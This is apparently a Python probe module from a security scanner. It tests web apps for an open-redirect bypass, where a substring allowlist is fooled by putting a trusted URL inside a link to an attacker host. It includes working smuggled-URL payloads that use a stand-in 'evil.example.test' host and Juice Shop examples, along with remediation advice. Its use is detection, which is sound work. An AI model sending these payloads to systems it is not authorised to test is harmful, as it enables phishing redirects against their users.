#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Open-redirect: substring-based allowlist bypassed via embedded URL.

Apps that gate `/redirect?to=...` on `allowedUrls.some(u =>
target.includes(u))` are vulnerable to a payload that smuggles a
trusted URL inside an attacker-controlled host. Juice Shop's
canonical bypass:
  /redirect?to=https://github.com/bkimminich/juice-shop?pwned=https://evil.example
  → server sees `https://github.com/...` substring on the allowlist
    and redirects to the literal full URL.

The end result depends on the redirect implementation: some apps
issue a 302 with `Location: <attacker URL>`, some render an HTML
meta-refresh, some return a JSON body with the URL. We accept any
of those signals.

Detection signal:
  GET /redirect?to=<smuggled URL> → response either issues a
  Location header to the attacker host, includes a meta-refresh
  pointing at it, or echoes the full URL back to the body.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from urllib.parse import quote, urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

REDIRECT_PATHS = (
    "/redirect",
    "/api/redirect",
    "/r",
    "/out",
    "/go",
)

# Trusted prefixes Juice Shop documents in its allowlist. We embed
# one of these in the smuggled URL so the substring-allowlist passes.
TRUSTED_PREFIXES = (
    "https://github.com/bkimminich/juice-shop",
    "https://github.com",
    "https://owasp.slack.com",
    "https://www.alchemy.com/",
)

EVIL_HOST = "evil.example.test"


def _hdr(headers: dict, name: str) -> str:
    name_l = name.lower()
    for k, v in headers.items():
        if k.lower() == name_l:
            return v
    return ""


class RedirectAllowlistBypassProbe(Probe):
    name = "redirect_allowlist_bypass"
    summary = ("Detects substring-allowlist open-redirect bypass — "
               "smuggled trusted URL inside attacker-controlled host.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--evil-host", default=EVIL_HOST,
            help="Host name we want the server to redirect to.")
        parser.add_argument(
            "--path", action="append", default=[],
            help="Additional redirect endpoint to test (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        evil = args.evil_host or EVIL_HOST
        paths = list(REDIRECT_PATHS) + list(args.path or [])

        attempts: list[dict] = []
        confirmed: dict | None = None
        meta_refresh_re = re.compile(
            r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]*?url=([^"\'>\s]+)',
            re.IGNORECASE)
        # Baseline-rejection cache per endpoint -- the comparative
        # signal is "bare evil URL rejected, smuggled evil URL
        # accepted". Apps that return 200 OK to BOTH are not actually
        # gating on an allowlist (no bypass to flag); apps that reject
        # both are gating correctly. The bypass is in the delta.
        baseline_rejected: dict[str, dict] = {}
        for path in paths:
            # 0. Baseline: bare evil URL with no smuggle. Most allow-
            # listing apps return 4xx for this. We record the status
            # so the smuggled variant can be compared against it.
            bare_url = urljoin(
                origin, f"{path}?to=https://{evil}")
            r0 = client.request("GET", bare_url)
            baseline_rejected[path] = {
                "url": bare_url,
                "status": r0.status,
                "size": r0.size,
                "rejected": r0.status >= 400,
            }
            attempts.append({**baseline_rejected[path], "kind": "baseline_bare_evil"})
            if not baseline_rejected[path]["rejected"]:
                # If the server accepts the bare evil URL, this isn't
                # an allowlist-bypass class -- it's an unguarded open
                # redirect, which is a different (existing) finding
                # class. Skip the smuggle phase for this endpoint to
                # avoid double-reporting.
                continue
            for trusted in TRUSTED_PREFIXES:
                # SMUGGLE 1 (legacy): trusted prefix is the host, evil
                # is a query string after `?pwned=`. Catches apps that
                # check whether the target *contains* a trusted prefix
                # and let the actual URL resolve to anywhere.
                target_v1 = f"{trusted}?pwned=https://{evil}"
                # SMUGGLE 2 (Juice Shop shape): evil is the host, the
                # trusted prefix is the query string. Catches apps
                # whose allowlist check is a substring match anywhere
                # in the URL, not just on the origin. This is the
                # variant the OWASP Juice Shop /redirect handler is
                # vulnerable to and is the more common modern bypass
                # because the resulting Location is unambiguously the
                # attacker host.
                target_v2 = f"https://{evil}/?{trusted}"
                for variant_name, raw_target in (
                        ("v1_trusted_host", target_v1),
                        ("v2_evil_host", target_v2)):
                    url = urljoin(origin,
                                  f"{path}?to={quote(raw_target, safe=':/?=&')}")
                    r = client.request("GET", url)
                    row: dict = {"kind": variant_name, "path": path,
                                 "url": url, "status": r.status,
                                 "size": r.size, "trusted_prefix": trusted}
                    # Don't follow redirects — we want to see Location.
                    location = _hdr(r.headers, "Location")
                    if location:
                        row["location"] = location
                        if evil in location:
                            row["redirect_to_evil"] = True
                            confirmed = row
                            attempts.append(row)
                            break
                    # Meta-refresh case (some apps emit refresh HTML
                    # instead of a 30x).
                    if r.body and r.text:
                        m = meta_refresh_re.search(r.text)
                        if m and evil in m.group(1):
                            row["meta_refresh"] = m.group(1)
                            confirmed = row
                            attempts.append(row)
                            break
                    # 200-OK differential: bare evil URL was rejected
                    # (status >= 400) but the smuggled variant returned
                    # 2xx. Treat as confirmed bypass even when the
                    # response is a body-rendered fetch rather than a
                    # 30x redirect -- the server-side allowlist is
                    # still passing an attacker-controllable target,
                    # which is the underlying defect regardless of
                    # whether it manifests as a Location header or an
                    # SSRF-like body fetch.
                    if (200 <= r.status < 300
                            and baseline_rejected[path]["rejected"]):
                        row["status_differential"] = (
                            f"baseline {baseline_rejected[path]['status']} -> "
                            f"smuggle {r.status}")
                        confirmed = row
                        attempts.append(row)
                        break
                    attempts.append(row)
                if confirmed:
                    break
            if confirmed:
                break

        evidence = {"origin": origin, "evil_host": evil,
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: open-redirect bypass at "
                         f"{confirmed['url']} — server redirected to "
                         f"{evil!r} via the trusted-prefix smuggle."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Validate the redirect target against an allowlist "
                    "of *parsed origins*, not substrings. In Node:\n"
                    "  const u = new URL(req.query.to);\n"
                    "  if (!ALLOWED_ORIGINS.has(u.origin)) return 400;\n"
                    "Substring matches are categorically unsafe — any "
                    "`.includes()` / `.startsWith()` allowlist can be "
                    "smuggled past with a query-string trick."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(attempts)} redirect "
                     f"candidates on {origin}; none redirected to "
                     f"{evil!r}."),
            evidence=evidence,
        )


if __name__ == "__main__":
    RedirectAllowlistBypassProbe().main()
